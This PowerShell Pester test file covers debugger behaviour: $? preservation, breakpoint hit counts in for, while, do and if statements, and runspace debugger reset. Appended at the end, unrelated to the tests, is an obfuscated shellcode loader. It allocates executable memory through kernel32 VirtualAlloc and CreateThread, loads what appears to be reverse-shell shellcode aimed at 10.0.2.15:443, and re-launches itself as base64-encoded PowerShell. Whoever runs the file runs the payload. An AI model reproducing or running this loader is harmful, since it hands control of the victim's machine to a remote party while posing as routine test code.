


Describe 'Basic debugger tests' -tag 'CI' {

    BeforeAll {
        Register-DebuggerHandler
    }

    AfterAll {
        Unregister-DebuggerHandler
    }

    Context 'The value of $? should be preserved when exiting the debugger' {
        BeforeAll {
            $testScript = {
                function Test-DollarQuestionMark {
                    [CmdletBinding()]
                    param()
                    Get-Process -id ([int]::MaxValue)
                    if (-not $?) {
                        'The value of $? was preserved during debugging.'
                    } else {
                        'The value of $? was changed to $true during debugging.'
                    }
                }
                $global:DollarQuestionMarkResults = Test-DollarQuestionMark -ErrorAction Break
            }

            $global:results = @(Test-Debugger -ScriptBlock $testScript -CommandQueue '$?')
        }

        AfterAll {
            Remove-Variable -Name DollarQuestionMarkResults -Scope Global -ErrorAction Ignore
        }

        It 'Should show 2 debugger commands were invoked' {
            
            $results.Count | Should -Be 2
        }

        It 'Should have $false output from the first $? command' {
            $results[0].Output | Should -BeOfType bool
            $results[0].Output | Should -Not -BeTrue
        }

        It 'Should have string output showing that $? was preserved as $false by the debugger' {
            $global:DollarQuestionMarkResults | Should -BeOfType string
            $global:DollarQuestionMarkResults | Should -BeExactly 'The value of $? was preserved during debugging.'
        }
    }
}

Describe "Breakpoints when set should be hit" -tag "CI" {
    Context "Basic tests" {
        BeforeAll {
            $script = @'
'aaa'.ToString() > $null
'aa' > $null
"a" 2> $null | ForEach-Object { $_ }
'bb' > $null
'bb'.ToSTring() > $null
'bbb'
'@
            $path = Setup -PassThru -File BasicTest.ps1 -Content $script
            $bps = 1..6 | ForEach-Object { set-psbreakpoint -script $path -line $_ -Action { continue } }
        }

        AfterAll {
            $bps | Remove-PSBreakPoint
        }

        It "A redirected breakpoint is hit" {
            & $path
            foreach ( $bp in $bps ) {
                $bp.HitCount | Should -Be 1
            }
        }
    }

    Context "Break point on switch condition should be hit only when enumerating it" {
        BeforeAll {
            $script = @'
$test = 1..2
switch ($test)
{
    default {}
}
'@
            $path = Setup -PassThru -File SwitchScript.ps1 -Content $script
            $breakpoint = Set-PSBreakpoint -Script $path -Line 2 -Action { continue }
        }

        AfterAll {
            Remove-PSBreakpoint -Breakpoint $breakpoint
        }

        It "switch condition should be hit 3 times" {
            
            $null = & $path
            $breakpoint.HitCount | Should -Be 3
        }
    }

    Context "Break point on for-statement initializer should be hit" {
        BeforeAll {
            $for_script_1 = @'
$test = 2
for ("string".Length;
     $test -gt 0; $test--) { }
'@

            $for_script_2 = @'
$test = $PSCommandPath
for (Test-Path $test;
     $test -eq "blah";) { }
'@

            $for_script_3 = @'
for ($test = 2;
     $test -gt 0; $test--) { }
'@

            $for_script_4 = @'
$test = 2
for (;$test -gt 0;
     $test--) { }
'@

            $for_script_5 = @'
$test = $PSCommandPath
for (;Test-Path $test;)
{
    $test = "blah"
}
'@
            $ForScript_1 = Setup -PassThru -File ForScript_1.ps1 -Content $for_script_1
            $bp_1 = Set-PSBreakpoint -Script $ForScript_1 -Line 2 -Action { continue }

            $ForScript_2 = Setup -PassThru -File ForScript_2.ps1 -Content $for_script_2
            $bp_2 = Set-PSBreakpoint -Script $ForScript_2 -Line 2 -Action { continue }

            $ForScript_3 = Setup -PassThru -File ForScript_3.ps1 -Content $for_script_3
            $bp_3 = Set-PSBreakpoint -Script $ForScript_3 -Line 1 -Action { continue }

            $ForScript_4 = Setup -PassThru -File ForScript_4.ps1 -Content $for_script_4
            $bp_4 = Set-PSBreakpoint -Script $ForScript_4 -Line 2 -Action { continue }

            $ForScript_5 = Setup -PassThru -File ForScript_5.ps1 -Content $for_script_5
            $bp_5 = Set-PSBreakpoint -Script $ForScript_5 -Line 2 -Action { continue }

            $testCases = @(
                @{ Name = "expression initializer should be hit once";    Path = $ForScript_1; Breakpoint = $bp_1; HitCount = 1 }
                @{ Name = "pipeline initializer should be hit once";      Path = $ForScript_2; Breakpoint = $bp_2; HitCount = 1 }
                @{ Name = "assignment initializer should be hit 3 times"; Path = $ForScript_3; Breakpoint = $bp_3; HitCount = 1 }
                @{ Name = "pipeline condition should be hit 3 times";     Path = $ForScript_4; Breakpoint = $bp_4; HitCount = 3 }
                @{ Name = "pipeline condition should be hit 2 times";     Path = $ForScript_5; Breakpoint = $bp_5; HitCount = 2 }
            )
        }

        AfterAll {
            Get-PSBreakpoint -Script $ForScript_1, $ForScript_2, $ForScript_3, $ForScript_4, $ForScript_5 | Remove-PSBreakpoint
        }

        It "for-statement <Name>" -TestCases $testCases {
            param($Path, $Breakpoint, $HitCount)
            $null = & $Path
            $Breakpoint.HitCount | Should -Be $HitCount
        }
    }

    Context "Break point on while loop condition should be hit" {
        BeforeAll {
            $while_script_1 = @'
$test = "string"
while ($test.Contains("str"))
{
    $test = "blah"
}
'@

            $while_script_2 = @'
$test = $PSCommandPath
while (Test-Path $test)
{
    $test = "blah"
}
'@
            $WhileScript_1 = Setup -PassThru -File WhileScript_1.ps1 -Content $while_script_1
            $bp_1 = Set-PSBreakpoint -Script $WhileScript_1 -Line 2 -Action { continue }

            $WhileScript_2 = Setup -PassThru -File WhileScript_2.ps1 -Content $while_script_2
            $bp_2 = Set-PSBreakpoint -Script $WhileScript_2 -Line 2 -Action { continue }

            $testCases = @(
                @{ Name = "expression condition should be hit 2 times"; Path = $WhileScript_1; Breakpoint = $bp_1; HitCount = 2 }
                @{ Name = "pipeline condition should be hit 2 times";   Path = $WhileScript_2; Breakpoint = $bp_2; HitCount = 2 }
            )
        }

        AfterAll {
            Get-PSBreakpoint -Script $WhileScript_1, $WhileScript_2 | Remove-PSBreakpoint
        }

        It "while loop <Name>" -TestCases $testCases {
            param($Path, $Breakpoint, $HitCount)
            $null = & $Path
            $Breakpoint.HitCount | Should -Be $HitCount
        }
    }

    Context "Break point on do-while loop condition should be hit" {
        BeforeAll {
            $do_while_script_1 = @'
$test = "blah"
do { echo $test }
while ($test.Contains("str"))
'@

            $do_while_script_2 = @'
$test = "blah"
do { echo $test }
while (Test-Path $test)
'@
            $DoWhileScript_1 = Setup -PassThru -File DoWhileScript_1.ps1 -Content $do_while_script_1
            $bp_1 = Set-PSBreakpoint -Script $DoWhileScript_1 -Line 2 -Action { continue }

            $DoWhileScript_2 = Setup -PassThru -File DoWhileScript_2.ps1 -Content $do_while_script_2
            $bp_2 = Set-PSBreakpoint -Script $DoWhileScript_2 -Line 2 -Action { continue }

            $testCases = @(
                @{ Name = "expression condition should be hit 2 times"; Path = $DoWhileScript_1; Breakpoint = $bp_1; HitCount = 1 }
                @{ Name = "pipeline condition should be hit 2 times";   Path = $DoWhileScript_2; Breakpoint = $bp_2; HitCount = 1 }
            )
        }

        AfterAll {
            Get-PSBreakpoint -Script $DoWhileScript_1, $DoWhileScript_2 | Remove-PSBreakpoint
        }

        It "Do-While loop <Name>" -TestCases $testCases {
            param($Path, $Breakpoint, $HitCount)
            $null = & $Path
            $Breakpoint.HitCount | Should -Be $HitCount
        }
    }

    Context "Break point on do-until loop condition should be hit" {
        BeforeAll {
            $do_until_script_1 = @'
$test = "blah"
do { echo $test }
until ($test.Contains("bl"))
'@

            $do_until_script_2 = @'
$test = $PSCommandPath
do { echo $test }
until (Test-Path $test)
'@
            $DoUntilScript_1 = Setup -PassThru -File DoUntilScript_1.ps1 -Content $do_until_script_1
            $bp_1 = Set-PSBreakpoint -Script $DoUntilScript_1 -Line 2 -Action { continue }

            $DoUntilScript_2 = Setup -PassThru -File DoUntilScript_2.ps1 -Content $do_until_script_2
            $bp_2 = Set-PSBreakpoint -Script $DoUntilScript_2 -Line 2 -Action { continue }

            $testCases = @(
                @{ Name = "expression condition should be hit 2 times"; Path = $DoUntilScript_1; Breakpoint = $bp_1; HitCount = 1 }
                @{ Name = "pipeline condition should be hit 2 times";   Path = $DoUntilScript_2; Breakpoint = $bp_2; HitCount = 1 }
            )
        }

        AfterAll {
            Get-PSBreakpoint -Script $DoUntilScript_1, $DoUntilScript_2 | Remove-PSBreakpoint
        }

        It "Do-Until loop <Name>" -TestCases $testCases {
            param($Path, $Breakpoint, $HitCount)
            $null = & $Path
            $Breakpoint.HitCount | Should -Be $HitCount
        }
    }

    Context "Break point on if condition should be hit" {
        BeforeAll {
            $if_script_1 = @'
if ("string".Contains('str'))
{ }
'@
            $if_script_2 = @'
if (Test-Path $PSCommandPath)
{ }
'@
            $if_script_3 = @'
if ($false) {}
elseif ("string".Contains('str'))
{ }
'@
            $if_script_4 = @'
if ($false) {}
elseif (Test-Path $PSCommandPath)
{ }
'@
            $IfScript_1 = Setup -PassThru -File IfScript_1.ps1 -Content $if_script_1
            $bp_1 = Set-PSBreakpoint -Script $IfScript_1 -Line 1 -Action { continue }

            $IfScript_2 = Setup -PassThru -File IfScript_2.ps1 -Content $if_script_2
            $bp_2 = Set-PSBreakpoint -Script $IfScript_2 -Line 1 -Action { continue }

            $IfScript_3 = Setup -PassThru -File IfScript_3.ps1 -Content $if_script_3
            $bp_3 = Set-PSBreakpoint -Script $IfScript_3 -Line 2 -Action { continue }

            $IfScript_4 = Setup -PassThru -File IfScript_4.ps1 -Content $if_script_4
            $bp_4 = Set-PSBreakpoint -Script $IfScript_4 -Line 2 -Action { continue }

            $testCases = @(
                @{ Name = "expression if-condition should be hit once";     Path = $IfScript_1; Breakpoint = $bp_1; HitCount = 1 }
                @{ Name = "pipeline if-condition should be hit once";       Path = $IfScript_2; Breakpoint = $bp_2; HitCount = 1 }
                @{ Name = "expression elseif-condition should be hit once"; Path = $IfScript_3; Breakpoint = $bp_3; HitCount = 1 }
                @{ Name = "pipeline elseif-condition should be hit once";   Path = $IfScript_4; Breakpoint = $bp_4; HitCount = 1 }
            )
        }

        AfterAll {
            Get-PSBreakpoint -Script $IfScript_1, $IfScript_2, $IfScript_3, $IfScript_4 | Remove-PSBreakpoint
        }

        It "If statement <Name>" -TestCases $testCases {
            param($Path, $Breakpoint, $HitCount)
            $null = & $Path
            $Breakpoint.HitCount | Should -Be $HitCount
        }
    }
}

Describe "It should be possible to reset runspace debugging" -tag "Feature" {
    BeforeAll {
        $script = @'
"line 1"
"line 2"
"line 3"
'@
        $scriptPath = Setup -PassThru -File TestScript.ps1 -Content $script
        $iss = [initialsessionstate]::CreateDefault2();
        $rs = [runspacefactory]::CreateRunspace($iss)
        $rs.Name = "TestRunspaceDebuggerReset"
        $rs.Open()
        $rs | Enable-RunspaceDebug

        $debuggerBeforeReset = $rs.Debugger

        
        $ps = [powershell]::Create()
        $ps.Runspace = $rs

        
        $result = $ps.AddScript("Set-PSBreakpoint -Script '$scriptPath' -line 1").Invoke()
        $ps.Commands.Clear()
        $result = $ps.AddScript("Set-PSBreakpoint -Script '$scriptPath' -line 3").Invoke()
        $ps.Commands.Clear()
        $breakpoints = $ps.AddScript("Get-PSBreakpoint").Invoke()

        
        $ar = $ps.AddScript("$scriptPath").BeginInvoke()
        $completed = Wait-UntilTrue { $rs.Debugger.InBreakPoint -eq $true } -timeout 10000 -interval 200
        $ps.Stop()
        $rs.ResetRunspaceState()
    }
    AfterAll {
        if ( $null -ne $ps ) { $ps.Dispose() }
        if ( $null -ne $ss ) { $rs.Dispose() }
    }
    It "2 breakpoints should have been set" {
        $breakpoints.Count | Should -Be 2
    }
    It "The breakpoint Should have been hit" {
        $completed | Should -BeTrue
    }
    It "The reset debugger should not be in a breakpoint" {
        $rs.Debugger.InBreakPoint | Should -BeFalse
    }
    It "The reset debugger should not be active" {
        $rs.Debugger.IsActive | Should -BeFalse
    }
    It "The reset debugger mode should be set to 'Default'" {
        $rs.Debugger.DebugMode | Should -Be "Default"
    }
    It "The debugger should be the same before and after the reset" {
        $rs.Debugger | Should -Be $debuggerBeforeReset
    }
    It "The breakpoints should be gone after reset" {
        $ps.Commands.clear()
        $ps.AddCommand("Get-PSBreakpoint").Invoke() | Should -BeNullOrEmpty
    }
    It "The script should run without a break" {
        $ps.Commands.Clear()
        $ps.addscript($scriptPath).Invoke().Count | Should -Be 3
    }
}

$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x00,0x02,0x0f,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}

